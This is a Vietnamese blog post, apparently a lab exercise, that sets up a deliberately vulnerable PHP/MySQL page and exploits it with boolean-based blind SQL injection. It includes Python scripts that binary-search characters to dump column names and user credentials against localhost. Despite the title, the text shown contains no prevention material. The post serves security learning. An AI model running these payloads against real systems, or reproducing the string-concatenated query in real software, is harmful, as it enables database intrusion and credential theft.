+++
date = '2025-12-28T04:26:07+07:00'
draft = false
title = 'Tìm hiểu về SQL injection và cách phòng chống'
image = 'cover.jpg'
categories = ['Security', 'SQL injection']
+++
# Task 2.2

> Tạo case SQLi dump data thủ công sex ra sao
<!--more-->
[Full source code tại đây](https://github.com/quyt0/sqli-cases/tree/main/sqli-dump)

## Ý tưởng, triển khai

Ở đây, ta sẽ tạo một bảng có tên **users** gồm 20 cột, 20 dòng để làm data mẫu. Sau đó sẽ tiến hành dump tất cả dữ liệu bằng cách chèn payload vào đoạn code dính lỗi SQL injection

Sử dụng PHP + MySQL với XAMPP. Dưới đây là chi tiết code triển khai

```sql
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50),
    password VARCHAR(100),
    -- Tạo 20 cột ...
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

```
Đoạn code PHP truy vấn theo trường id dính SQL injection. Trong đó, nếu tìm được data sẽ trả về thẻ `<h3>User Info:</h3>`, nếu không trả về `No user found.`

```PHP
$id = $_GET['id'] ?? '';

// Câu truy vấn nhận trực tiếp input của người dùng dẫn tới SQLi
$sql = "SELECT * FROM users WHERE id = $id";
$stmt = $pdo->query($sql);

if ($stmt) {
    $row = $stmt->fetch(PDO::FETCH_ASSOC);
    if ($row) {
        echo "<h3>User Info:</h3><pre>" . print_r($row, true) . "</pre>";
    } else {
        echo "No user found.";
    }
} else {
    echo "Invalid query.";
}
?>

```

## Dump dữ liệu trong bảng

### Dump tất cả các cột

Để dump tất cả các cột, ta sẽ dùng dùng `LIMIT` để lần lượt lấy các cột trong `information_schema.columns`. Sau đó, với mỗi cột lấy được sẽ dùng `ASCII` và `SUBSTRING` để brute-force từng kí tự --> tìm ra tên cột

Script dump bằng Python

```Python
import requests

url = "http://localhost/task02/22/index.php"

def send_req(payload):
    params ={
        'id': f"1 AND {payload}"
    }
    try:
        response = requests.get(url, params=params)
        return ("username" in response.text)
    except Exception as e:
        print("Request error:", e)
        return False

def get_col(index, max_len=30):
    col_name = ""
    for pos in range(1, max_len + 1):
        low = 32
        high = 126
        found_char = None

        while low <= high:
            mid = (low + high) // 2
            payload = f"ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT {index},1),{pos},1))={mid}"
            if send_req(payload):
                found_char = chr(mid)
                col_name += found_char
                break
            else:
                payload = f"ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT {index},1),{pos},1))>{mid}"
                if send_req(payload):
                    low = mid + 1
                else:
                    high = mid - 1

        if found_char is None:
            break
    return f"#{index}: {col_name}"

for i in range(0, 41):
    print(get_col(i))
```

Gọi dump ước chừng 40 cột, ta thấy script dump đến #22 thì hết
![image](https://hackmd.io/_uploads/BkmmLzrRkl.png)

trong đó từ #0 đến #19 là các cột được admin tạo

### Dump từng dòng

Sau khi đã có tất cả các cột rồi, ta sẽ dump từng dòng cũng bằng phương pháp binary search như trên

```Python
def dump_field(column_name, row_index, max_len=30):
    result = ""
    for pos in range(1, max_len + 1):
        low = 32
        high = 126
        found_char = None

        while low <= high:
            mid = (low + high) // 2
            payload = f"ASCII(SUBSTRING((SELECT {column_name} FROM users LIMIT {row_index},1),{pos},1))={mid}"
            if send_req(payload):
                found_char = chr(mid)
                result += found_char
                break
            else:
                payload = f"ASCII(SUBSTRING((SELECT {column_name} FROM users LIMIT {row_index},1),{pos},1))>{mid}"
                if send_req(payload):
                    low = mid + 1
                else:
                    high = mid - 1

        if found_char is None:
            break  # end of string
    return result

columns = ["id", "username", "email", "password"]
for row_index in range(10):  # dump 10 dòng đầu
    for col in columns:
        value = dump_field(col, row_index)
        print(f"    {col}: {value}")
    print("\n")
```

Kết quả
![image](https://hackmd.io/_uploads/Bkw8_zB0Je.png)